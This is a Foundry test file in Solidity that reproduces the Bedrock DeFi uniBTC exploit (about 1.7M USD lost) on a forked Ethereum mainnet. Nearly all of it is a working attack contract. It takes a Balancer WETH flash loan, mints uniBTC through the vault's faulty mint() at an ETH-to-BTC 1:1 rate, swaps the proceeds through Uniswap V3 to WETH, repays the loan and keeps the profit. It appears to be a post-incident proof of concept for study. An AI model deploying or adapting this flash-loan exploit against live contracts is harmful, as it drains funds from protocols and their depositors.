// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~1.7M US$
// Attacker : https://etherscan.io/address/0x2bFB373017349820dda2Da8230E6b66739BE9F96
// Attack Contract : https://etherscan.io/address/0x0C8da4f8B823bEe4D5dAb73367D45B5135B50faB
// Created Attack Contract: https://etherscan.io/address/0x1E1d02D663228e5D47f1De64030B39632A3B787D
// Vulnerable Contract : https://etherscan.io/address/0x047D41F2544B7F63A8e991aF2068a363d210d6Da
// Attack Tx : https://etherscan.io/tx/0x725f0d65340c859e0f64e72ca8260220c526c3e0ccde530004160809f6177940

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x702696b2aa47fd1d4feaaf03ce273009dc47d901#code
// L2417-2420, mint() function

// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contrasts involved
address constant uniBTC = 0x004E9C3EF86bc1ca1f0bB5C7662861Ee93350568;
address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
address constant uniV3Router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
address constant balancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

// Implementation: https://etherscan.io/address/0x702696b2aa47fd1d4feaaf03ce273009dc47d901#code
address constant VulVault = 0x047D41F2544B7F63A8e991aF2068a363d210d6Da;

contract Bedrock_DeFi_exp is Test {
    address attacker = makeAddr("attacker");
    Attacker attackerC;

    function setUp() public {
        vm.createSelectFork("mainnet", 20_836_584 - 1);
    }

    function testPoCMinimal() public {
        // Borrow 200 ether to the attacker
        vm.deal(attacker, 200e18);

        // The attacker mint 200 ETH to 200 uniBTC
        vm.startPrank(attacker);
        IFS(VulVault).mint{value: 200e18}();

        // The attacker received 200 uniBTC(~BTC) for 200 ETH
        console.log("Final balance in uniBTC :", IFS(uniBTC).balanceOf(attacker));
    }

    function testPoCReplicate() public {
        vm.startPrank(attacker);
        attackerC = new Attacker();

        attackerC.attack();

        console.log("Final balance in WETH :", IFS(weth).balanceOf(attacker));
    }
}

contract Attacker {
    address txSender;

    function attack() external {
        txSender = msg.sender;

        IFS(uniBTC).approve(uniV3Router, type(uint256).max);
        IFS(WBTC).approve(uniV3Router, type(uint256).max);

        address[] memory tokens = new address[](1);
        tokens[0] = weth;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 30_800_000_000_000_000_000;
        IFS(balancerVault).flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        IFS(weth).withdraw(amounts[0]);
        IFS(VulVault).mint{value: address(this).balance}();
        uint256 bal_uniBTC = IFS(uniBTC).balanceOf(address(this));

        IFS.ExactInputSingleParams memory input = IFS.ExactInputSingleParams(
            uniBTC, // address tokenIn;
            WBTC, // address tokenOut;
            500, // uint24 fee;
            address(this), // address recipient;
            block.timestamp, // uint256 deadline;
            bal_uniBTC, // uint256 amountIn;
            0, // uint256 amountOutMinimum;
            0 // uint160 sqrtPriceLimitX96;
        );

        IFS(uniV3Router).exactInputSingle(input);

        uint256 balWBTC = IFS(WBTC).balanceOf(address(this));

        input = IFS.ExactInputSingleParams(
            WBTC, // address tokenIn;
            weth, // address tokenOut;
            500, // uint24 fee;
            address(this), // address recipient;
            block.timestamp, // uint256 deadline;
            balWBTC, // uint256 amountIn;
            0, // uint256 amountOutMinimum;
            0 // uint160 sqrtPriceLimitX96;
        );

        IFS(uniV3Router).exactInputSingle(input);
        IFS(weth).transfer(balancerVault, amounts[0]);

        uint256 bal_weth = IFS(weth).balanceOf(address(this));
        IFS(weth).transfer(txSender, bal_weth);
    }

    receive() external payable {}
}

interface IFS is IERC20 {
    // balancerVault
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;

    // WETH
    function withdraw(
        uint256 wad
    ) external;

    // Vulnerable Vault
    function mint() external payable;

    // Uniswap V3: SwapRouter
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);
}
